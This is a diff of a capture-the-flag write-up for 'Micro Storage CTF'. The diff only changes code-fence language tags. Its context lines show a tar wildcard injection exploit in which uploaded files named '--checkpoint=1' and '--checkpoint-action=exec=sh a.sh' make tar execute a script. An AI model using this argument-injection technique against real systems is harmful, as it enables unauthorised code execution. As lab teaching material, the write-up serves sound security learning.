@@ -6,7 +6,7 @@ Micro Storage CTF is a quick glimpse into remote code execution via improper scr
 
 Connect to the DockerApp with `nc` using the command:
 
-```/bin/bash
+```zsh
 nc <IP_ADDR> <PORT>
 ```
 
@@ -20,7 +20,7 @@ Note: You cannot type `/`,`$`,`%`,`*`,`()`,`{}`,`!` and other special characters
 
 When picking the 5th option, it gives the following:
 
-```
+```zsh
 >>> Choose an option: 5
 [+] Your base64 encoded archive:
 VEVTVAAAAAAAAAAAAAAAAAAAAAAAAAA ... AAAAAAAAAAAAAAA==
@@ -40,7 +40,7 @@ Since we can name the files whatever we want, we will be naming them as paramete
 
 **Step 1: Set up checkpoint**
 
-```
+```zsh
 >>> Choose an option: 1
 [*] Enter your file name: --checkpoint=1
 [*] Start typing your file content: (send 'EOF' when done)
@@ -53,7 +53,7 @@ This enables the tar command to wait and execute an arbitrary action before cont
 
 **Step 2: Set up action**
 
-```
+```zsh
 >>> Choose an option: 1
 [*] Enter your file name: --checkpoint-action=exec=sh a.sh
 [*] Start typing your file content: (send 'EOF' when done)
@@ -65,7 +65,7 @@ This sets up `tar` to execute a file called `a.sh` in its local directory (Since
 
 **Step 3: Set up a.sh**
 
-```
+```zsh
 >>> Choose an option: 1
 [*] Enter your file name: a.sh
 [*] Start typing your file content: (send 'EOF' when done)
